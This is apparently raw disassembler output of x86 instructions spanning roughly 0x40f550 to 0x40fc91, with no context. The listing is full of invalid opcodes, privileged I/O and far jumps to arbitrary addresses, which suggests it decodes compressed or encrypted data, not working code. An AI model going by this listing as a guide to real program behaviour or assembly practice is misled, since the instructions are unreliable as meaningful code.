  40f550:	mov    edx,0x4e9d0745
  40f555:	xchg   DWORD PTR [ebx-0x1a8dd0e9],ecx
  40f55b:	retf   0x5615
  40f55e:	push   esi
  40f55f:	push   esi
  40f560:	push   0xa5e15ab5
  40f565:	dec    ebx
  40f566:	xchg   edi,eax
  40f567:	sahf   
  40f568:	js     0x40f563
  40f56a:	in     eax,0x97
  40f56c:	mov    edi,0x85c2e176
  40f571:	out    0x37,eax
  40f573:	aaa    
  40f574:	aaa    
  40f575:	das    
  40f576:	mov    eax,ds:0x3ccd63c6
  40f57b:	or     al,ch
  40f57d:	sar    BYTE PTR [edi+eax*2+0x64],cl
  40f581:	int3   
  40f582:	sub    BYTE PTR [ebx],dh
  40f584:	enter  0x2a3,0x59
  40f588:	mov    al,0x2f
  40f58a:	sub    eax,ebx
  40f58c:	addr16 jle 0x40f59c
  40f58f:	push   ebx
  40f590:	test   al,0xa0
  40f592:	cmp    eax,0xcbcbcb0f
  40f597:	push   edi
  40f598:	xchg   edi,eax
  40f599:	xchg   edi,eax
  40f59a:	xchg   edi,eax
  40f59b:	das    
  40f59c:	(bad)  
  40f59d:	(bad)  
  40f59e:	outs   dx,DWORD PTR ds:[esi]
  40f59f:	std    
  40f5a0:	(bad)  
  40f5a1:	push   edi
  40f5a2:	sub    dl,BYTE PTR [ebp-0x54a952b6]
  40f5a8:	aad    0x17
  40f5aa:	pop    ss
  40f5ab:	pop    ss
  40f5ac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f5ad:	out    0xe6,eax
  40f5af:	out    0xe6,al
  40f5b1:	imul   DWORD PTR [esi]
  40f5b3:	mov    cs,WORD PTR cs:[ebp-0x42307071]
  40f5ba:	std    
  40f5bb:	ins    DWORD PTR es:[edi],dx
  40f5bc:	outs   dx,DWORD PTR ds:[esi]
  40f5bd:	sti    
  40f5be:	call   0xc13132fa
  40f5c3:	je     0x40f57e
  40f5c5:	push   esp
  40f5c6:	and    dl,BYTE PTR [ecx+0x75cea192]
  40f5cc:	cmp    BYTE PTR [eax],bl
  40f5ce:	or     al,0xb8
  40f5d0:	jp     0x40f5b7
  40f5d2:	or     bh,BYTE PTR [ebp+0x39854f5e]
  40f5d8:	xchg   ecx,esp
  40f5da:	mov    ?,WORD PTR [esi]
  40f5dc:	add    eax,0xe28270f3
  40f5e1:	mov    ?,WORD PTR [eax-0x227653d1]
  40f5e7:	jge    0x40f632
  40f5e9:	pop    ss
  40f5ea:	sub    eax,0xd99155a8
  40f5ef:	outs   dx,BYTE PTR ds:[esi]
  40f5f0:	scas   al,BYTE PTR es:[edi]
  40f5f1:	fwait
  40f5f2:	sbb    DWORD PTR [edi],esi
  40f5f4:	into   
  40f5f5:	std    
  40f5f6:	add    eax,0x1bc35c20
  40f5fb:	push   0x76
  40f5fd:	out    0xd5,al
  40f5ff:	cmc    
  40f600:	dec    ebp
  40f601:	push   esi
  40f602:	push   esi
  40f603:	xlat   BYTE PTR ds:[ebx]
  40f604:	pop    ecx
  40f605:	ds jge 0x40f59e
  40f608:	inc    eax
  40f609:	out    0x6a,eax
  40f60b:	ins    BYTE PTR es:[edi],dx
  40f60c:	xor    al,0xaa
  40f60e:	xor    al,0x9b
  40f610:	or     eax,0x250df3be
  40f615:	stos   BYTE PTR es:[edi],al
  40f616:	(bad)  
  40f618:	loopne 0x40f621
  40f61a:	ds jno 0x40f624
  40f61d:	sahf   
  40f61e:	cmp    al,0xc2
  40f620:	dec    di
  40f622:	jo     0x40f60d
  40f624:	jb     0x40f5f2
  40f626:	jmp    0xb4f8:0x2ea716ea
  40f62d:	ss scas eax,DWORD PTR es:[edi]
  40f62f:	lock jmp 0xff7a8d64
  40f635:	in     al,dx
  40f636:	inc    ebp
  40f637:	out    dx,al
  40f638:	pop    esi
  40f639:	in     al,dx
  40f63a:	push   ecx
  40f63b:	test   eax,0x8ce9d02c
  40f640:	jle    0x40f684
  40f642:	jecxz  0x40f67e
  40f644:	ss jbe 0x40f5e8
  40f647:	add    ah,BYTE PTR [edx+edi*4]
  40f64a:	push   esi
  40f64b:	cs xchg edi,eax
  40f64d:	inc    ebx
  40f64e:	pop    esi
  40f64f:	lds    esi,FWORD PTR [esi+0x53]
  40f652:	sub    al,BYTE PTR [eax+0x4958994]
  40f658:	(bad)  
  40f659:	lods   eax,DWORD PTR ds:[esi]
  40f65a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f65b:	rol    BYTE PTR [eax-0x2a],1
  40f65e:	push   es
  40f65f:	loopne 0x40f617
  40f661:	dec    edx
  40f662:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f663:	mov    ds:0xa9d1b8f,al
  40f668:	in     al,dx
  40f669:	mov    dh,0xeb
  40f66b:	sbb    esi,esi
  40f66d:	scas   al,BYTE PTR es:[edi]
  40f66e:	ja     0x40f6bc
  40f670:	sar    DWORD PTR [edx+0x585d5d09],1
  40f676:	pop    eax
  40f677:	pusha  
  40f678:	jbe    0x40f6f0
  40f67a:	ss xchg ebx,eax
  40f67c:	fwait
  40f67d:	int    0xec
  40f67f:	mov    edi,0x9712e974
  40f684:	das    
  40f685:	pop    edi
  40f686:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f687:	xlat   BYTE PTR ds:[ebx]
  40f688:	jmp    0x40f65b
  40f68a:	push   0xaeebb834
  40f68f:	mov    ebx,0xcd9d9d98
  40f694:	fs push cs
  40f696:	mov    fs,WORD PTR [edx-0x31188c78]
  40f69c:	jno    0x40f692
  40f69e:	call   0x37782cf4
  40f6a3:	or     DWORD PTR [ebx-0xb],eax
  40f6a6:	in     eax,dx
  40f6a7:	ret    0x6c30
  40f6aa:	popf   
  40f6ab:	aas    
  40f6ac:	jg     0x40f6ac
  40f6ae:	fcomp  DWORD PTR [ecx-0x156198cd]
  40f6b4:	je     0x40f6f0
  40f6b6:	sub    ebp,DWORD PTR [eax]
  40f6b8:	and    dh,BYTE PTR [ebx]
  40f6ba:	test   eax,0xe6510c74
  40f6bf:	jne    0x40f6bf
  40f6c1:	fnsave [esp+edx*8+0x168a3d59]
  40f6c8:	mov    cl,BYTE PTR [eax-0x32240c4]
  40f6ce:	out    0xd5,al
  40f6d0:	pop    es
  40f6d1:	adc    DWORD PTR [edx],0xffffffa2
  40f6d4:	shl    DWORD PTR [eax-0x30],0x1f
  40f6d8:	or     al,0x6
  40f6da:	fistp  DWORD PTR [ebx-0x38946465]
  40f6e0:	mov    ds,WORD PTR ds:0xef77b73b
  40f6e6:	fdivrp st(1),st
  40f6e8:	cmp    ebp,edi
  40f6ea:	mov    esp,0xab5ea973
  40f6ef:	mov    ebp,0x9fa7a9f3
  40f6f4:	sahf   
  40f6f5:	outs   dx,BYTE PTR ds:[esi]
  40f6f6:	call   0x173bf9f7
  40f6fb:	pop    ss
  40f6fc:	cdq    
  40f6fd:	popf   
  40f6fe:	popf   
  40f6ff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f700:	fldcw  WORD PTR [edx+esi*2-0x31]
  40f704:	mov    ebp,0x849322f7
  40f709:	mov    ch,0xd5
  40f70b:	push   ebp
  40f70c:	mov    dh,0xb6
  40f70e:	mov    dh,0x58
  40f710:	pop    ebx
  40f711:	pop    ebp
  40f712:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f713:	(bad)  [edx+0x11]
  40f716:	inc    ebp
  40f717:	xchg   ecx,eax
  40f718:	dec    edx
  40f719:	jle    0x40f744
  40f71b:	and    eax,0x59a42e5e
  40f720:	test   al,0x4e
  40f722:	iret   
  40f723:	adc    BYTE PTR [ebp+0x6ff966fd],dh
  40f729:	ins    DWORD PTR es:[edi],dx
  40f72a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f72b:	xchg   DWORD PTR [ecx+0x2],eax
  40f72e:	mov    ecx,0x9191a7e0
  40f733:	xchg   ecx,eax
  40f734:	arpl   WORD PTR [esi+ebp*2],di
  40f737:	pop    es
  40f738:	gs inc esp
  40f73a:	mov    fs,WORD PTR [edi+0x4b9510b2]
  40f740:	and    eax,0x25252015
  40f745:	and    ecx,0xffffff90
  40f748:	(bad)  
  40f749:	pusha  
  40f74a:	sar    dl,0xfa
  40f74d:	xchg   esi,eax
  40f74e:	cmp    eax,0x280e5caf
  40f753:	push   ebp
  40f754:	retf   0xaad4
  40f757:	gs out dx,al
  40f759:	cwde   
  40f75a:	fwait
  40f75b:	loopne 0x40f71e
  40f75d:	xlat   BYTE PTR ds:[ebx]
  40f75e:	dec    esp
  40f75f:	xor    DWORD PTR [ecx],esi
  40f761:	faddp  st(0),st
  40f763:	or     esi,esi
  40f765:	repnz leave 
  40f767:	enter  0xd3a3,0xbe
  40f76b:	xor    DWORD PTR [ebp-0x527ce113],0xffffffd3
  40f772:	les    esi,FWORD PTR [ecx-0x7e]
  40f775:	out    dx,eax
  40f776:	(bad)  
  40f777:	mov    eax,es:0x7e80820d
  40f77d:	mov    edi,0x7c00c85f
  40f782:	(bad)  
  40f784:	cli    
  40f785:	rol    BYTE PTR [edi+0x1aaaf43e],1
  40f78b:	les    esi,FWORD PTR [esi-0x1b]
  40f78e:	push   es
  40f78f:	je     0x40f80e
  40f791:	mov    eax,ds:0x75c7e826
  40f796:	add    esp,DWORD PTR [esi-0x1]
  40f799:	aam    0x36
  40f79b:	cmc    
  40f79c:	in     eax,dx
  40f79d:	and    al,0x63
  40f79f:	arpl   WORD PTR [ebx-0x6],sp
  40f7a2:	mov    esp,0xbca0366c
  40f7a7:	gs jle 0x40f7d1
  40f7aa:	xlat   BYTE PTR ds:[ebx]
  40f7ab:	pop    esp
  40f7ac:	mov    esi,0xee10a915
  40f7b1:	mov    edx,0x2a5bc4cd
  40f7b6:	mov    cl,0x67
  40f7b8:	iret   
  40f7b9:	push   ds
  40f7ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f7bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f7bc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f7bd:	imul   esi,DWORD PTR [edx+ebx*1],0x71c66b99
  40f7c4:	ins    BYTE PTR es:[edi],dx
  40f7c5:	sub    eax,0x8b56adf5
  40f7ca:	jp     0x40f789
  40f7cc:	into   
  40f7cd:	sbb    eax,0xc2c1dc77
  40f7d2:	ret    0xf502
  40f7d5:	jp     0x40f7b4
  40f7d7:	fisub  WORD PTR [ebx-0x60]
  40f7da:	mov    eax,ds:0x2793c9f0
  40f7df:	mov    ecx,0x4e92e974
  40f7e4:	mov    dl,BYTE PTR [edx-0x56ad4ece]
  40f7ea:	xor    al,0xfd
  40f7ec:	xchg   esi,eax
  40f7ed:	mov    bh,0xbc
  40f7ef:	in     eax,0x7
  40f7f1:	(bad)  
  40f7f3:	fdivrp st(7),st
  40f7f5:	jle    0x40f7de
  40f7f7:	cdq    
  40f7f8:	xor    esp,DWORD PTR [edi+0x3e]
  40f7fb:	call   esp
  40f7fd:	push   ebx
  40f7fe:	dec    edi
  40f7ff:	cmp    eax,0xf1f8fc7a
  40f804:	push   ebx
  40f805:	fcmovu st,st(7)
  40f807:	pop    edi
  40f808:	bound  edx,QWORD PTR [eax+edi*8-0x47]
  40f80c:	retf   
  40f80d:	xlat   BYTE PTR ds:[ebx]
  40f80e:	in     eax,dx
  40f80f:	jp     0x40f7f8
  40f811:	fsub   DWORD PTR [edx]
  40f813:	js     0x40f7a9
  40f815:	fistp  WORD PTR [edi+0x674ae1e6]
  40f81b:	adc    DWORD PTR [ebx-0x1bb0bef8],edi
  40f821:	daa    
  40f822:	add    al,0x12
  40f824:	fcomip st,st(7)
  40f826:	retf   
  40f827:	or     ecx,DWORD PTR [ebx]
  40f829:	or     ecx,DWORD PTR [ebx]
  40f82b:	neg    ebp
  40f82d:	ja     0x40f80e
  40f82f:	loope  0x40f822
  40f831:	icebp  
  40f832:	icebp  
  40f833:	cmp    ebp,esi
  40f835:	mov    edi,0x4bc3feff
  40f83a:	dec    ebx
  40f83b:	dec    ebx
  40f83c:	fist   WORD PTR [edi+ebp*4-0x29]
  40f840:	daa    
  40f841:	imul   esi,DWORD PTR [ebp+0x638e355a],0x2e
  40f848:	pop    esp
  40f849:	mov    eax,0x2793c9c0
  40f84e:	pop    ecx
  40f84f:	pop    ecx
  40f850:	pop    ecx
  40f851:	loope  0x40f82b
  40f853:	or     ebp,DWORD PTR [edi]
  40f855:	push   eax
  40f856:	sub    dl,BYTE PTR [ebp-0x13142858]
  40f85c:	(bad)  [edi+0x59d9d98f]
  40f862:	data16 cmp WORD PTR [bx+si-0x39],di
  40f868:	sbb    eax,0x8e475dc
  40f86d:	add    ch,al
  40f86f:	cmc    
  40f870:	sti    
  40f871:	pop    esp
  40f872:	pop    ecx
  40f873:	pop    ecx
  40f874:	mov    eax,ds:0xb1b16add
  40f879:	mov    esi,0x3a0a6cae
  40f87e:	dec    esi
  40f87f:	inc    ecx
  40f880:	mov    al,ds:0x6c6d77f5
  40f885:	hlt    
  40f886:	repnz test bh,ch
  40f889:	stos   BYTE PTR es:[edi],al
  40f88a:	imul   ecx,esi,0x4b
  40f88d:	gs or  bl,bl
  40f890:	gs (bad) 
  40f892:	es cli 
  40f894:	shl    BYTE PTR [ebp+0x38eb980f],1
  40f89a:	jno    0x40f8ac
  40f89c:	nop
  40f89d:	mov    edx,0xb7b7b71d
  40f8a2:	sbb    DWORD PTR [esi],ecx
  40f8a4:	xchg   DWORD PTR [ebx+ecx*8+0x59d51b65],edx
  40f8ab:	sub    dl,BYTE PTR [ebp-0x51fb66d8]
  40f8b1:	call   0x3110:0x60c02569
  40f8b8:	sbb    BYTE PTR [esp+ebp*4+0x6f],al
  40f8bc:	mov    ah,0x39
  40f8be:	jno    0x40f8b2
  40f8c0:	mov    esp,0x3531ec4d
  40f8c5:	cmp    esi,eax
  40f8c7:	clc    
  40f8c8:	les    eax,FWORD PTR [ebx+edi*2]
  40f8cb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f8cc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f8cd:	cmp    DWORD PTR [ebp+0x3f6b7121],esi
  40f8d3:	out    0x63,al
  40f8d5:	push   ebx
  40f8d6:	jp     0x40f895
  40f8d8:	fimul  WORD PTR [eax-0x56ad4ff5]
  40f8de:	lock aam 0x53
  40f8e1:	dec    edi
  40f8e2:	mov    ch,0x8b
  40f8e4:	aas    
  40f8e5:	stc    
  40f8e6:	in     eax,dx
  40f8e7:	imul   edi,DWORD PTR [ebx-0x4bbcffbf],0x6f
  40f8ee:	aas    
  40f8ef:	or     al,0x87
  40f8f1:	call   0x710c:0x10876390
  40f8f8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f8f9:	arpl   WORD PTR [ebx-0x1b],bx
  40f8fc:	inc    ecx
  40f8fd:	iret   
  40f8fe:	(bad)  
  40f8ff:	jmp    0x2dbd621f
  40f904:	mov    bh,0x9e
  40f906:	stos   DWORD PTR es:[edi],eax
  40f907:	inc    esi
  40f908:	in     al,dx
  40f909:	je     0x40f957
  40f90b:	(bad)  
  40f90c:	js     0x40f8c1
  40f90e:	outs   dx,BYTE PTR ds:[esi]
  40f90f:	hlt    
  40f910:	sti    
  40f911:	pop    edx
  40f912:	lods   eax,DWORD PTR ds:[esi]
  40f913:	inc    esi
  40f914:	mov    bl,0xd9
  40f916:	fs iret 
  40f918:	sahf   
  40f919:	cmp    eax,0xb9b5e4b6
  40f91e:	jg     0x40f8df
  40f920:	fbld   TBYTE PTR [edi-0x4d4e952b]
  40f926:	mov    dl,0x42
  40f928:	sbb    BYTE PTR [esi+0xe75ebd4],al
  40f92e:	pop    ds
  40f92f:	ds int3 
  40f931:	(bad)  
  40f933:	pushf  
  40f934:	mov    ch,0xea
  40f936:	sbb    edi,ebp
  40f938:	jle    0x40f9ad
  40f93a:	jae    0x40f8cf
  40f93c:	adc    esp,DWORD PTR [edi]
  40f93e:	dec    esi
  40f93f:	jo     0x40f922
  40f941:	ret    0x8605
  40f944:	inc    ebx
  40f945:	cmc    
  40f946:	fiadd  WORD PTR [esi]
  40f948:	cmc    
  40f949:	sbb    bh,bh
  40f94b:	jp     0x40f95d
  40f94d:	add    al,0x2c
  40f94f:	cs cs jb 0x40f937
  40f953:	enter  0xa991,0xb7
  40f957:	mov    edi,0xf5dfedfd
  40f95c:	ror    DWORD PTR [edi],0x7e
  40f95f:	lock add ebp,DWORD PTR [edi]
  40f962:	mov    esi,0x9f73e2f8
  40f967:	(bad)  
  40f968:	hlt    
  40f969:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f96a:	push   eax
  40f96c:	cdq    
  40f96d:	addr16 sahf 
  40f96f:	jns    0x40f99b
  40f971:	push   esp
  40f972:	push   eax
  40f973:	sar    eax,0x90
  40f976:	repnz pushf 
  40f978:	mov    dl,0x88
  40f97a:	adc    DWORD PTR [eax-0x158511fe],edi
  40f980:	sub    DWORD PTR [ecx+0x5e],0xe8973ec1
  40f987:	xchg   DWORD PTR [ebp+0x313aa952],esp
  40f98d:	xor    DWORD PTR [ecx-0x42211099],esi
  40f993:	or     ecx,DWORD PTR [ebx+0x4b]
  40f996:	dec    ebx
  40f997:	sti    
  40f998:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f999:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f99a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f99b:	out    0x5e,eax
  40f99d:	sti    
  40f99e:	fcmovbe st,st(7)
  40f9a0:	push   ds
  40f9a1:	pop    edx
  40f9a2:	pop    edx
  40f9a3:	pop    edx
  40f9a4:	jp     0x40f983
  40f9a6:	clc    
  40f9a7:	clc    
  40f9a8:	clc    
  40f9a9:	test   BYTE PTR [ebx-0x1a523d4c],bl
  40f9af:	mov    eax,0xad40b0b0
  40f9b4:	push   esi
  40f9b5:	jecxz  0x40f993
  40f9b7:	mov    ecx,0x6adbb473
  40f9bc:	int3   
  40f9bd:	jbe    0x40f97a
  40f9bf:	pop    ebp
  40f9c0:	mov    ds,WORD PTR [edi]
  40f9c2:	aas    
  40f9c3:	into   
  40f9c4:	mov    ebp,DWORD PTR [edi]
  40f9c6:	mov    esi,0xfcc21968
  40f9cb:	cld    
  40f9cc:	mov    esp,0x68d1179a
  40f9d1:	xor    BYTE PTR [ecx],dh
  40f9d3:	ds into 
  40f9d5:	mov    esi,0x7839fbfd
  40f9da:	(bad)  
  40f9db:	sbb    eax,0x6ed04278
  40f9e0:	mov    ch,0xe8
  40f9e2:	je     0x40fa1e
  40f9e4:	ss das 
  40f9e6:	shl    DWORD PTR [eax+0x30],0xb0
  40f9ea:	dec    esp
  40f9eb:	and    esi,edx
  40f9ed:	div    ebx
  40f9ef:	sbb    DWORD PTR [ebp+0x83996f2],eax
  40f9f5:	xchg   ecx,eax
  40f9f6:	dec    edx
  40f9f7:	icebp  
  40f9f8:	pushf  
  40f9f9:	call   0x52f3:0xc40cf220
  40fa00:	data16 loopne 0x40f9a3
  40fa03:	or     ebp,DWORD PTR [ecx-0x1bcf3c29]
  40fa09:	loopne 0x40f98c
  40fa0b:	add    edx,DWORD PTR [ebx+ebp*1-0x512245eb]
  40fa12:	jb     0x40f99f
  40fa14:	or     DWORD PTR es:[ebp-0x5c996892],ebx
  40fa1b:	xchg   ecx,eax
  40fa1c:	xor    cl,BYTE PTR [edi+eax*4]
  40fa1f:	mov    ch,bl
  40fa21:	cmp    esp,edi
  40fa23:	push   ecx
  40fa24:	adc    al,0x71
  40fa26:	in     eax,0xea
  40fa28:	cmp    dl,BYTE PTR [edi-0x7df6a9a9]
  40fa2e:	gs cmp eax,0xb191bc0e
  40fa34:	imul   ebp,esp,0x5f053b24
  40fa3a:	lds    esi,FWORD PTR [ecx+0x7c]
  40fa3d:	fld    TBYTE PTR [ebx+0x6edbe701]
  40fa43:	adc    BYTE PTR [eax+0xf],al
  40fa46:	int3   
  40fa47:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fa48:	xchg   BYTE PTR [esi],cl
  40fa4a:	push   edx
  40fa4b:	es inc esp
  40fa4d:	push   ecx
  40fa4e:	push   0xfffffff4
  40fa50:	push   ebx
  40fa51:	test   BYTE PTR [ecx+0x22],ah
  40fa54:	in     al,0xd2
  40fa56:	jl     0x40fac6
  40fa58:	push   edx
  40fa59:	mov    ebx,0xbd448c4c
  40fa5e:	adc    eax,0x6197406e
  40fa63:	dec    esp
  40fa64:	dec    esp
  40fa65:	dec    esp
  40fa66:	xor    BYTE PTR [ebx],dh
  40fa68:	xor    eax,DWORD PTR [ebx-0x53]
  40fa6b:	push   esi
  40fa6c:	mov    bl,0x1c
  40fa6e:	xlat   BYTE PTR ds:[ebx]
  40fa6f:	and    BYTE PTR [esi+0x5675f5f5],cl
  40fa75:	push   esi
  40fa76:	push   esi
  40fa77:	push   0xbef8dbb7
  40fa7c:	iret   
  40fa7d:	(bad)  
  40fa7f:	sbb    al,0x7b
  40fa81:	imul   esi
  40fa83:	mov    ch,0xf3
  40fa85:	(bad)  
  40fa87:	(bad)  
  40fa88:	pop    ebx
  40fa89:	pop    ebx
  40fa8a:	pop    ebx
  40fa8b:	jecxz  0x40fa12
  40fa8d:	pop    ss
  40fa8e:	pop    esi
  40fa8f:	loopne 0x40fa73
  40fa91:	lds    ecx,FWORD PTR [ebx-0x582040c]
  40fa97:	std    
  40fa98:	mov    esi,0x60618ebd
  40fa9d:	cs icebp 
  40fa9f:	fbstp  TBYTE PTR [ebp-0x29]
  40faa2:	pop    ebp
  40faa3:	sbb    al,0x3a
  40faa5:	je     0x40fa2f
  40faa7:	mov    DWORD PTR [ecx-0x3d95e5f7],ecx
  40faad:	dec    edi
  40faae:	xor    BYTE PTR [ebx],bh
  40fab0:	cmp    edi,ebx
  40fab2:	cli    
  40fab3:	xlat   BYTE PTR ds:[ebx]
  40fab4:	mov    ebp,0x7faf75ee
  40fab9:	jmp    0x3fb3:0xf6bea7a9
  40fac0:	sti    
  40fac1:	mov    bl,0xff
  40fac3:	jbe    0x40fb2a
  40fac5:	gs in  eax,0xa
  40fac8:	retf   0x6f5a
  40facb:	es push eax
  40facd:	and    al,0xce
  40facf:	xor    ah,BYTE PTR [ecx+ebx*1+0x41]
  40fad3:	jbe    0x40fa6b
  40fad5:	dec    ebx
  40fad6:	push   ss
  40fad7:	(bad)  
  40fad8:	out    0xd1,eax
  40fada:	outs   dx,DWORD PTR ds:[esi]
  40fadb:	sar    DWORD PTR [edx],1
  40fadd:	cli    
  40fade:	fiadd  DWORD PTR [ebx]
  40fae0:	inc    eax
  40fae1:	int3   
  40fae2:	iret   
  40fae3:	iret   
  40fae4:	iret   
  40fae5:	mov    esp,0x7b6f6ded
  40faea:	jmp    0x40fa87
  40faec:	(bad)  
  40faee:	out    0x37,al
  40faf0:	iret   
  40faf1:	int3   
  40faf2:	int3   
  40faf3:	fcomp  QWORD PTR [ebp+0x2e]
  40faf6:	xchg   edi,eax
  40faf7:	imul   edx,ebp,0x6a
  40fafa:	aad    0x13
  40fafc:	inc    edx
  40fafd:	pop    eax
  40fafe:	sub    bh,0x76
  40fb01:	inc    edi
  40fb02:	repz fstp DWORD PTR [ebx-0x5271c721]
  40fb09:	pop    edx
  40fb0a:	je     0x40fb02
  40fb0c:	in     al,dx
  40fb0d:	pop    ecx
  40fb0e:	sbb    edx,eax
  40fb10:	in     al,0x66
  40fb12:	mov    ecx,0x9cbb76ed
  40fb17:	cmp    BYTE PTR [ecx-0x3e],dh
  40fb1a:	xor    ah,BYTE PTR [eax-0x2d]
  40fb1d:	inc    edi
  40fb1e:	inc    ecx
  40fb1f:	adc    BYTE PTR [eax],dh
  40fb21:	xor    eax,0xa5bec535
  40fb26:	and    eax,0xb34f4cf6
  40fb2b:	je     0x40fb1d
  40fb2d:	and    ch,cl
  40fb2f:	inc    esi
  40fb30:	ret    
  40fb31:	or     al,BYTE PTR [ecx-0x5344892]
  40fb37:	ficomp DWORD PTR [edx]
  40fb39:	std    
  40fb3a:	pop    esi
  40fb3b:	(bad)  
  40fb3c:	jbe    0x40faf9
  40fb3e:	dec    ebp
  40fb3f:	dec    edi
  40fb40:	pop    es
  40fb41:	int3   
  40fb42:	and    al,0x86
  40fb44:	leave  
  40fb45:	or     al,BYTE PTR [ecx+0x671d90d4]
  40fb4b:	push   ds
  40fb4c:	mov    ebp,0xdea0d71
  40fb51:	jmp    0xd46:0x45aa39db
  40fb58:	aam    0xc
  40fb5a:	shl    DWORD PTR [ebx],0x45
  40fb5d:	mov    al,ds:0xf4f818a0
  40fb62:	hlt    
  40fb63:	xor    al,0x41
  40fb65:	test   eax,0xeac71244
  40fb6a:	stc    
  40fb6b:	jne    0x40fb74
  40fb6d:	mov    edx,0x6122a536
  40fb72:	in     al,0x4e
  40fb74:	outs   dx,DWORD PTR ds:[esi]
  40fb75:	ja     0x40fbb4
  40fb77:	dec    ebp
  40fb78:	stc    
  40fb79:	arpl   WORD PTR ds:0xe9d3a3cf,di
  40fb7f:	mov    WORD PTR [edi+ebx*1-0x5454fefc],ds
  40fb86:	stos   DWORD PTR es:[edi],eax
  40fb87:	imul   edi,DWORD PTR [edx+ecx*8+0x3a6a6ed],0x27
  40fb8f:	mov    DWORD PTR [ecx+0x5e391fe],edx
  40fb95:	push   eax
  40fb96:	arpl   dx,bx
  40fb98:	sbb    BYTE PTR [ecx+eax*2],al
  40fb9b:	jge    0x40fba8
  40fb9d:	iret   
  40fb9e:	repz xchg ecx,eax
  40fba0:	xor    cl,cl
  40fba2:	or     al,0x96
  40fba4:	sbb    ecx,ecx
  40fba6:	add    edx,DWORD PTR [eax-0x7b121e89]
  40fbac:	or     ah,bl
  40fbae:	loopne 0x40fb4d
  40fbb0:	jmp    0x2767659e
  40fbb5:	daa    
  40fbb6:	inc    edi
  40fbb7:	repnz mov cl,0x77
  40fbba:	cmp    bl,BYTE PTR ds:0x59575756
  40fbc0:	pop    edi
  40fbc1:	pop    edi
  40fbc2:	inc    edi
  40fbc3:	or     BYTE PTR [ecx+0x7d],ah
  40fbc6:	clc    
  40fbc7:	xchg   ebx,eax
  40fbc8:	xchg   ebx,eax
  40fbc9:	xchg   ebx,eax
  40fbca:	cli    
  40fbcb:	cmp    DWORD PTR [ebp-0x42],esi
  40fbce:	(bad)  
  40fbcf:	lods   eax,DWORD PTR ds:[esi]
  40fbd0:	sub    eax,0xcd3e9f4e
  40fbd5:	jmp    0x452ea3ad
  40fbda:	sahf   
  40fbdb:	xchg   ebp,eax
  40fbdc:	xchg   ebp,eax
  40fbdd:	xchg   ebp,eax
  40fbde:	mov    ds:0xfd1e8f47,eax
  40fbe3:	and    ebx,edi
  40fbe5:	test   edi,0xeee6e6e7
  40fbeb:	fidiv  WORD PTR [edi-0x566e2091]
  40fbf1:	test   eax,0xa952c5a9
  40fbf6:	and    al,0xc2
  40fbf8:	xor    BYTE PTR [esi+esi*2+0x76],ah
  40fbfc:	xchg   esi,eax
  40fbfd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fbfe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fbff:	and    eax,0xca6ad1d
  40fc04:	mov    edi,ebp
  40fc06:	jle    0x40fc67
  40fc08:	dec    ecx
  40fc09:	xchg   esi,eax
  40fc0a:	xor    ah,ah
  40fc0c:	lea    ebp,[edi+0x7c]
  40fc0f:	jecxz  0x40fc2c
  40fc11:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fc12:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fc13:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fc14:	dec    cl
  40fc16:	dec    edi
  40fc17:	push   esp
  40fc19:	dec    edi
  40fc1a:	inc    esp
  40fc1c:	cdq    
  40fc1d:	xor    esp,DWORD PTR [edi+0x4e]
  40fc20:	mov    ds:0xe1818090,al
  40fc25:	outs   dx,BYTE PTR ds:[esi]
  40fc26:	int    0x2f
  40fc28:	mov    bh,0xb9
  40fc2a:	test   dh,ch
  40fc2c:	cmp    DWORD PTR [edi+0x321cca30],edi
  40fc32:	frstor [edi-0x2857c651]
  40fc38:	jmp    0x40fc9d
  40fc3a:	(bad)  
  40fc3c:	cld    
  40fc3d:	lock mov ebx,0x37c6f8de
  40fc43:	mov    esi,0xefbbeee1
  40fc48:	jle    0x40fcba
  40fc4a:	jb     0x40fcbe
  40fc4c:	jb     0x40fc20
  40fc4e:	xor    DWORD PTR fs:[edx],esi
  40fc51:	test   BYTE PTR [edi-0x1c],dl
  40fc54:	sbb    eax,0xddcdfb71
  40fc59:	outs   dx,DWORD PTR ds:[esi]
  40fc5a:	pop    esp
  40fc5b:	cmp    bl,0xf7
  40fc5e:	out    dx,eax
  40fc5f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fc60:	push   esp
  40fc61:	sub    dh,BYTE PTR [ecx+0x18e1b1b1]
  40fc67:	jp     0x40fcce
  40fc69:	xchg   BYTE PTR [ecx],ah
  40fc6b:	mov    eax,0xc71c562a
  40fc70:	pushf  
  40fc71:	aas    
  40fc72:	jg     0x40fc12
  40fc74:	in     eax,0xe5
  40fc76:	cmp    eax,DWORD PTR gs:[ebp+0xccccf78]
  40fc7d:	mov    bl,0x33
  40fc7f:	xor    ebp,esp
  40fc81:	fnstenv [ebx+0x585f987]
  40fc87:	neg    BYTE PTR [edi]
  40fc89:	cmp    BYTE PTR [eax-0x31],ah
  40fc8c:	in     eax,dx
  40fc8d:	cmc    
  40fc8e:	jp     0x40fcb9
  40fc90:	pop    edx
  40fc91:	call   0xbbb5e60c
